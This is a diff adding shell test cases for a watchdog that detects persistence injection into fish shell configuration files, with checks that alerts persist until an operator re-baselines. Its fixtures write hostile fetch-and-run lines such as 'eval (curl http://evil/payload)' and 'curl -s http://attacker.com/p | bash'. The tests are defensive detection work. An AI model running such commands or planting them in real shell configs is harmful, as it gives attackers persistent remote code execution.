@@ -207,3 +207,44 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-fish-config -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): fish-config-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 interactive-shell persistence — alert MUST persist across
+    # runs until operator explicitly re-baselines.
+    printf 'set -gx EDITOR vi\n' > "${CONF}"
+    run_wd
+    printf 'eval (curl http://evil/payload)\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/fish/conf.d + /etc/fish/functions + ~/.config/fish/conf.d axes — injection in EITHER → alert)" {
+    CONF_D2="${TMP}/fish-conf.d"; mkdir -p "${CONF_D2}"
+    printf 'set -gx EDITOR vi\n' > "${CONF}"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_FISH_PROFILE="report" \
+    SELFDEF_FISH_BASELINE="${BASELINE}" \
+    SELFDEF_FISH_DIRS="${CONF_D2}" \
+    SELFDEF_FISH_FILES="${CONF}" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'eval (curl http://evil/payload)\n' > "${CONF_D2}/evil.fish"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_FISH_PROFILE="report" \
+    SELFDEF_FISH_BASELINE="${BASELINE}" \
+    SELFDEF_FISH_DIRS="${CONF_D2}" \
+    SELFDEF_FISH_FILES="${CONF}" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    printf 'curl -s http://attacker.com/p | bash\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
